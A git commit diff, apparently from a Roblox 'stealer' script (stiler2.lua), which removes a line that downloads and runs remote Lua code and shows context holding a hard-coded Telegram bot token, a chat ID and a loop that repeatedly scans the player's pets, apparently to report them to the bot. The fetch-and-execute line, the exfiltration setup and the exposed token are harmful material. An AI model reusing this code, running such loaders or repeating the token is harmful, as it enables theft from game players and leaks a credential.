e1368ecf6be71c2f4a86d177a27cebd408bdf2d4
PiotrIsCool <138518646+PiotrIsCool@users.noreply.github.com>
2025-08-20 14:16:42 +0200

    Update stiler2.lua

--- stiler2.lua
+++ stiler2.lua
@@ -1,5 +1,3 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/PiotrIsCool/Thunderx/refs/heads/main/stiler2.lua"))()
-
 -- Telegram bot settings
 local BOT_TOKEN = "8446879035:AAH1DGTI_M8FAX0y0RNVv8q1k1MsOhMj6e4"
 local CHAT_ID = "2001061743"
@@ -104,4 +102,5 @@ while true do
 	scanMyPets()
 	task.wait(1)
 end
+
 
